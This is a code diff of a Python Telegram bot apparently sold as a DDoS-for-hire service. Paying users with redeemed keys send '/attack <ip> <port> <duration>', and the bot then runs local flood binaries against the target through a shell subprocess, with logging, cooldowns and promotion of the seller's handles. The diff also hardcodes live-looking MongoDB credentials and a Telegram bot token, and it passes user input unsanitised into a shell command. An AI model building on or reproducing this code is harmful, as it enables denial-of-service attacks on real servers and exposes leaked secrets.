@@ -7,12 +7,12 @@ import platform
 import random
 import string
 from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
+from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler, ContextTypes
 from pymongo import MongoClient
 from datetime import datetime, timedelta, timezone
 
 # Database Configuration
-MONGO_URI = 'mongodb+srv://Vampirexcheats:Vampirexcheats@vampirexcheats.bhtxe.mongodb.net/TEST?retryWrites=true&w=majority&appName=Vampirexcheats'
+MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
 client = MongoClient(MONGO_URI)
 db = client['VAMPIRE']
 users_collection = db['users']
@@ -21,7 +21,7 @@ redeem_codes_collection = db['redeem_codes']
 attack_logs_collection = db['user_attack_logs']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7635786772:AAHGl_d_Oq2I9xxsWWQTgWPoiuq88qMU0ho'
+TELEGRAM_BOT_TOKEN = '7743496050:AAHYdXnkOBnCb7-ZUotvq6obfDJpE8VyfEs'
 ADMIN_USER_ID = 529691217
 COOLDOWN_PERIOD = timedelta(minutes=1) 
 user_last_attack_time = {} 
@@ -38,7 +38,7 @@ valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')
 
 # Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
 LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
-PROTECTED_FILES = ["Vampire.py", "Vampire"]
+PROTECTED_FILES = ["Vampire.py", "vampire"]
 BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']
 
 # Fetch the current user and hostname dynamically
@@ -346,7 +346,7 @@ async def start(update: Update, context: CallbackContext):
 
     # Check if the user is allowed to use the bot
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*❌  You are not authorized to use this bot! please connect to the owner grab your keys @Demon_Rocky*", parse_mode='Markdown')
         return
 
     message = (
@@ -490,47 +490,54 @@ async def show_settings(update: Update, context: CallbackContext):
 
     await context.bot.send_message(chat_id=update.effective_chat.id, text=settings_text, parse_mode='Markdown')
 
-async def list_users(update, context):
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     current_time = datetime.now(timezone.utc)
-    users = users_collection.find() 
-    
+    users = list(users_collection.find())  # Convert cursor to list
+
     user_list_message = "👥 User List:\n"
-    
-    for user in users:
-        user_id = user['user_id']
-        expiry_date = user['expiry_date']
-        if expiry_date.tzinfo is None:
-            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
-    
-        time_remaining = expiry_date - current_time
-        if time_remaining.days < 0:
-            remaining_days = -0
-            remaining_hours = 0
-            remaining_minutes = 0
-            expired = True  
-        else:
-            remaining_days = time_remaining.days
-            remaining_hours = time_remaining.seconds // 3600
-            remaining_minutes = (time_remaining.seconds // 60) % 60
-            expired = False 
-        
-        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
-        if expired:
-            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
-        else:
-            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
+
+    if not users:  # Check if the user collection is empty
+        user_list_message += "No users found."
+    else:
+        for user in users:
+            user_id = user['user_id']
+            expiry_date = user.get('expiry_date')  # Safely get expiry_date
+
+            if expiry_date is None:  # Check if expiry_date is None
+                user_list_message += f"🔴 *User ID: {user_id} - Expiry: Not set*\n"
+                continue  # Skip to the next user
+
+            # Ensure expiry_date is timezone-aware
+            if isinstance(expiry_date, datetime) and expiry_date.tzinfo is None:
+                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
+
+            time_remaining = expiry_date - current_time
+            if time_remaining.days < 0:
+                remaining_days = 0
+                remaining_hours = 0
+                remaining_minutes = 0
+                expired = True  
+            else:
+                remaining_days = time_remaining.days
+                remaining_hours = time_remaining.seconds // 3600
+                remaining_minutes = (time_remaining.seconds // 60) % 60
+                expired = False 
+
+            expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
+            if expired:
+                user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
+            else:
+                user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
 
     await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')
 
 async def is_user_allowed(user_id):
     user = users_collection.find_one({"user_id": user_id})
     if user:
-        expiry_date = user['expiry_date']
+        expiry_date = user.get('expiry_date')  # Safely get expiry_date
         if expiry_date:
-            # Ensure expiry_date is timezone-aware
-            if expiry_date.tzinfo is None:
+            if isinstance(expiry_date, datetime) and expiry_date.tzinfo is None:
                 expiry_date = expiry_date.replace(tzinfo=timezone.utc)
-            # Compare with the current time
             if expiry_date > datetime.now(timezone.utc):
                 return True
     return False
@@ -603,97 +610,149 @@ async def log_attack(user_id, ip, port, duration):
     attack_logs_collection.insert_one(attack_log)
 
 # Modify attack function to log attack history
-ongoing_attacks = {}  # Tracks IP:port combinations where attacks are running
+active_attack_user = None
+active_attack_start_time = None
+active_attack_duration = None
 
 async def attack(update: Update, context: CallbackContext):
+    global active_attack_user, active_attack_start_time, active_attack_duration
+
     chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user
+    user_id = update.effective_user.id  # Get the user ID
     current_time = datetime.now(timezone.utc)
+
+    # Instant response: Attack has been initiated
+    await context.bot.send_message(chat_id=chat_id, text="*⚡ Attack initiated... Please wait while we process your request!*", parse_mode='Markdown')
 
     # Check if the user is allowed to use the bot
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! please connect to the owner grab your keys @Demon_Rocky*", parse_mode='Markdown')
         return
 
-    # Check if the attack is already running on the specified IP:port
+    # Admin ko koi restriction nahi honi chahiye
+    if user_id == ADMIN_USER_ID:
+        pass  # Admin can always attack, no waiting time or restrictions
+
+    else:
+        # Agar attack chal raha ho to dusra user attack nahi kar sakta
+        if active_attack_user is not None:
+            # Agar koi aur user ka attack chal raha ho
+            elapsed_time = current_time - active_attack_start_time
+            remaining_time = active_attack_duration - elapsed_time
+
+            if remaining_time > timedelta(seconds=0):  # Agar attack chal raha hai
+                remaining_minutes = remaining_time.seconds // 60
+                remaining_seconds = remaining_time.seconds % 60
+
+                # Notify the user to wait until the current attack finishes
+                await context.bot.send_message(
+                    chat_id=chat_id, 
+                    text=f"*⚠️ An attack is currently ongoing. Please wait for {remaining_minutes} minute(s) and {remaining_seconds} second(s) before trying again.*", 
+                    parse_mode='Markdown'
+                )
+                return
+            else:
+                # Agar attack complete ho gaya ho
+                active_attack_user = None
+                active_attack_start_time = None
+                active_attack_duration = None
+
+    # Process attack arguments
     args = context.args
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*🔰 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
 
     ip, port, duration = args
 
-    # Check if there is already an ongoing attack on this IP:port combination
-    if (ip, port) in ongoing_attacks:
-        # Inform the user that they need to wait
-        remaining_time = ongoing_attacks[(ip, port)] - current_time
-        if remaining_time > timedelta(seconds=0):
-            await context.bot.send_message(
-                chat_id=chat_id, 
-                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again on {ip}:{port}.*", 
-                parse_mode='Markdown'
-            )
-            return
+    # Validate IP prefix
+    if not ip.startswith(valid_ip_prefixes):
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP prefix. Only specific IP ranges are allowed.*", parse_mode='Markdown')
+        return
 
-    # Continue with attack logic
+    # Agar user ne pehle attack kiya ho to unhe wo block karna
+    if user_id != ADMIN_USER_ID and user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port*", parse_mode='Markdown')
+        return
+
     try:
         duration = int(duration)
 
-        # Validate duration
+        # Get max attack duration from the database
         max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
         max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else DEFAULT_MAX_ATTACK_TIME
 
+        # Agar attack duration limit se zyada ho, toh error dikhaye
         if duration > max_attack_time:
-            await context.bot.send_message(chat_id=chat_id, text=f"*🔰 Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*", parse_mode='Markdown')
+            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*", parse_mode='Markdown')
             return
 
     except ValueError:
-        await context.bot.send_message(chat_id=chat_id, text="*🔰 Duration must be an integer representing seconds.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be an integer representing seconds.*", parse_mode='Markdown')
         return
 
-    # Retrieve attack command settings
+    # Set attack command (Vampire)
     argument_type = settings_collection.find_one({"setting": "argument_type"})
     argument_type = argument_type["value"] if argument_type else 3  # Default to 3 if not set
 
+    # Get byte size and thread count from the database
     byte_size = settings_collection.find_one({"setting": "byte_size"})
     threads = settings_collection.find_one({"setting": "threads"})
+
     byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
     threads = threads["value"] if threads else DEFAULT_THREADS
 
-    # Construct attack command based on argument type
+    # Set Vampire attack command
     if argument_type == 3:
-        attack_command = f"./Vampire3 {ip} {port} {duration}"
+        attack_command = f"./vampire3 {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./Vampire4 {ip} {port} {duration} {threads}"
+        attack_command = f"./vampire4 {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./Vampire {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./vampire {ip} {port} {duration} {byte_size} {threads}"
 
-    # Log attack to database
-    await log_attack(user_id, ip, port, duration)
-
-    # Send attack details to user
-     await context.bot.send_message(chat_id=chat_id, text=( 
-        f"*⚡ ÐȺƦʞᏔǝß 𐌀丅丅ɐcʞ ℓαυη¢ђє∂! ☠️*\n"
-        f"*🎯 Target: {ip}:{port}*\n"
-        f"*⌛ Duration: {duration} seconds*\n"
-        f"*🔰•------» 𝙻𝚎𝚝 𝚑𝚎 𝚋𝚊𝚝𝚝𝚕𝚎𝚏𝚒𝚎𝚕𝚍 𝚒𝚐𝚗𝚢𝚝𝚎! «------•☢️*"
+    # Send attack details to the user (after instant response)
+    await context.bot.send_message(chat_id=chat_id, text=(
+    f"*⚡𝗗𝗮𝗿𝗸Ꮤǝ𝗕 𝗔丅丅𝗮𝗰𝗸 𝗟𝗮𝘂𝗻𝗰𝗵ə𝗱 ☠️*\n" 
+    f"*🖥️ 𝗧𝗮𝗿𝗴𝗲𝘁:: {ip}:{port}*\n"
+    f"*⌛ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀*\n"
+    f"*🚀•---» 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! «---•🚀 *"
     ), parse_mode='Markdown')
 
-    # Mark the attack as ongoing by storing the end time
-    ongoing_attacks[(ip, port)] = current_time + timedelta(seconds=duration)
+    # Log the attack (save details to the database or log file)
+    await log_attack(user_id, ip, port, duration)
 
-    # Run the attack in the background
+    # Mark the user as the active attacker and save the start time and duration
+    active_attack_user = user_id
+    active_attack_start_time = current_time
+    active_attack_duration = timedelta(seconds=duration)
+
+    # Run the attack command asynchronously
     asyncio.create_task(run_attack(chat_id, attack_command, context))
 
-    # Update cooldown time for the user
+    # Update the last attack time for the user
     cooldown_dict[user_id] = current_time
-
-    # Track the attack history
     if user_id not in user_attack_history:
         user_attack_history[user_id] = set()
     user_attack_history[user_id].add((ip, port))
 
 
+
+async def run_attack(chat_id, attack_command, context):
+    try:
+        process = await asyncio.create_subprocess_shell(
+            attack_command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+
+    finally:
+        await context.bot.send_message(chat_id=chat_id, text="*🚀𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀*\n*𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗼𝘂𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀 @Vampirexcheats*", parse_mode='Markdown')
 
 # Command to view the attack history of a user
 async def view_attack_log(update: Update, context: CallbackContext):
@@ -704,7 +763,7 @@ async def view_attack_log(update: Update, context: CallbackContext):
 
     # Ensure the correct number of arguments are provided
     if len(context.args) < 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /log <user_id>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /log <user_id>*", parse_mode='Markdown')
         return
 
     target_user_id = int(context.args[0])
@@ -712,7 +771,7 @@ async def view_attack_log(update: Update, context: CallbackContext):
     # Retrieve attack logs for the user
     attack_logs = attack_logs_collection.find({"user_id": target_user_id})
     if attack_logs_collection.count_documents({"user_id": target_user_id}) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 No attack history found for this user.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user.*", parse_mode='Markdown')
         return
 
     # Display the logs in a formatted way
@@ -741,7 +800,7 @@ async def delete_attack_log(update: Update, context: CallbackContext):
 
     # Ensure the correct number of arguments are provided
     if len(context.args) < 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /delete_log <user_id>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /delete_log <user_id>*", parse_mode='Markdown')
         return
 
     target_user_id = int(context.args[0])
@@ -752,25 +811,7 @@ async def delete_attack_log(update: Update, context: CallbackContext):
     if result.deleted_count > 0:
         await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Deleted {result.deleted_count} attack log(s) for user {target_user_id}.*", parse_mode='Markdown')
     else:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 No attack history found for this user to delete.*", parse_mode='Markdown')
-
-
-async def run_attack(chat_id, attack_command, context):
-    try:
-        process = await asyncio.create_subprocess_shell(
-            attack_command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user to delete.*", parse_mode='Markdown')
 
 # Function to generate a redeem code with a specified redemption limit and optional custom code name
 async def generate_redeem_code(update: Update, context: CallbackContext):
@@ -959,6 +1000,9 @@ async def delete_code(update: Update, context: CallbackContext):
 # Function to list redeem codes
 async def list_codes(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
+    print("list_codes function called")  # Debugging statement
+
+    # Check if the user is authorized
     if user_id != ADMIN_USER_ID:
         await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
         return
@@ -974,37 +1018,39 @@ async def list_codes(update: Update, context: CallbackContext):
     
     current_time = datetime.now(timezone.utc)
     for code in codes:
-        expiry_date = code['expiry_date']
-        
+        expiry_date = code.get('expiry_date')  # Use .get() to avoid KeyError
+        if expiry_date is None:
+            continue  # Skip if expiry_date is not set
+
         # Ensure expiry_date is timezone-aware
         if expiry_date.tzinfo is None:
             expiry_date = expiry_date.replace(tzinfo=timezone.utc)
-        
+
         # Format expiry date to show only the date (YYYY-MM-DD)
         expiry_date_str = expiry_date.strftime('%Y-%m-%d')
-        
+
         # Calculate the remaining time
         time_diff = expiry_date - current_time
         remaining_minutes = time_diff.total_seconds() // 60  # Get the remaining time in minutes
-        
+
         # Avoid showing 0.0 minutes, ensure at least 1 minute is displayed
-        remaining_minutes = max(1, remaining_minutes)  # If the remaining time is less than 1 minute, show 1 minute
-        
+        remaining_minutes = max(1, remaining_minutes)
+
         # Display the remaining time in a more human-readable format
         if remaining_minutes >= 60:
-            remaining_days = remaining_minutes // 1440  # Days = minutes // 1440
-            remaining_hours = (remaining_minutes % 1440) // 60  # Hours = (minutes % 1440) // 60
+            remaining_days = remaining_minutes // 1440
+            remaining_hours = (remaining_minutes % 1440) // 60
             remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
         else:
             remaining_time = f"({int(remaining_minutes)} minutes)"
-        
+
         # Determine whether the code is valid or expired
         if expiry_date > current_time:
             status = "✅"
         else:
             status = "❌"
             remaining_time = "(Expired)"
-        
+
         message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"
 
     await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
@@ -1013,10 +1059,10 @@ async def list_codes(update: Update, context: CallbackContext):
 async def is_user_allowed(user_id):
     user = users_collection.find_one({"user_id": user_id})
     if user:
-        expiry_date = user['expiry_date']
+        expiry_date = user.get('expiry_date')  # Safely get expiry_date
         if expiry_date:
-            if expiry_date.tzinfo is None:
-                expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness
+            if isinstance(expiry_date, datetime) and expiry_date.tzinfo is None:
+                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
             if expiry_date > datetime.now(timezone.utc):
                 return True
     return False
